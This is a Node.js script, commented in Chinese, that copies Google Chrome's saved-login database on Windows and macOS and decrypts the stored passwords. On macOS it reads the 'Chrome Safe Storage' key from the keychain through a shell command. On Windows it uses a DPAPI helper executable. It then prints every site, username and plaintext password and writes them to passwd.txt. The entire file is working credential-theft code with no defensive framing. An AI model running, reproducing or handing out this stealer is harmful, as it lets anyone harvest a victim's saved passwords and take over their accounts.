var sqlite3 = require("sqlite3");
var shelljs = require("shelljs");
var fs = require("fs");
var os = require("os");
var path = require("path");
var crypto = require("crypto");
var fileLoginPath = [];
var userLoginInfo = [];

if ( os.platform() == "win32" ) {
    fileLoginPath.push( path.join(process.env.HOME, "/AppData/Local/Google/Chrome/User Data/Default/Login Data") );
}

if ( os.platform() == "darwin" ) {
    fileLoginPath.push( path.join(process.env.HOME, "/Library/Application Support/Google/Chrome/Default/Login Data") );
}

/// 生成临时文件。
if ( !fs.existsSync("./tmp") ) {
    fs.mkdirSync("./tmp");
}

for ( var i = 0; i < fileLoginPath.length; ++i ) {
    if ( fs.existsSync(fileLoginPath[i]) ) {
        fs.writeFileSync("./tmp/Login Data", fs.readFileSync(fileLoginPath[i]));
        takeUserInfo();
        break;
    }
}

/// 获取 logins 中的数据。
function takeUserInfo() {
    var database = new sqlite3.Database("./tmp/Login Data", sqlite3.OPEN_READONLY);

    database.all("SELECT origin_url,action_url,username_value,password_value FROM logins", function( error, data ) {
        if ( error || !data || !data.length ) {
            return;
        }
        
        for ( var i = 0; i < data.length; ++i ) {
            if ( data[i] && data[i].password_value && data[i].password_value.length ) {
                userLoginInfo.push({ origin_url: data[i].origin_url, action_url: data[i].action_url, username_value: data[i].username_value, password_value: data[i].password_value });
            }
        }
        
        decryptLoginInfo();
    });

    database.close();
}

/// 解密用户账号和密码。
function decryptLoginInfo() {
    if ( os.platform() == "darwin" ) {
        var salt = new Buffer("saltysalt", "ascii");
        var iv = new Buffer(" ".repeat(16), "ascii");
        var iterations = 1003;
        var length = 16;
        var keychain = new Buffer(shelljs.exec('security find-generic-password -w -s "Chrome Safe Storage"', { silent: true }).stdout.trim());
        var password = crypto.pbkdf2Sync(keychain, salt, iterations, length);
        
        for ( var k = 0; k < userLoginInfo.length; ++k ) {
            var info = userLoginInfo[k];
            var ipwd = info.password_value.slice(3);
            var cipher = crypto.createDecipheriv("aes-128-cbc", password, iv);
            var decrypted  = cipher.update(ipwd);
                decrypted += cipher.final();
                
            info.password_value = decrypted;
        }
    }
    
    if ( os.platform() == "win32" ) {
        for ( var k = 0; k < userLoginInfo.length; ++k ) {
            var info = userLoginInfo[k];
            info.password_value = info.password_value.toString("base64");
            info.password_value = new Buffer(shelljs.exec('.\\bin\\dpapibridge.exe --decrypt --base64 --input \"' + info.password_value + '\"', { silent: true }).stdout.trim(), "base64");
        }
    }
    
    lsPrint();
}

/// 打印账号密码信息。
function lsPrint() {
    var file = path.join(process.cwd(), "./passwd.txt");
    var result = [];
    
    for ( var i = 0; i < userLoginInfo.length; ++i ) {
        var arr = [];
        
        arr.push("Origin  : " + userLoginInfo[i].origin_url,     "Action  : " + userLoginInfo[i].action_url);
        arr.push("Username: " + userLoginInfo[i].username_value, "Password: " + userLoginInfo[i].password_value);
        
        result.push(arr.join("\n"));
    }
    
    result = result.join("\n\n");
    console.log(result);
    
    fs.writeFileSync(file, result);
}
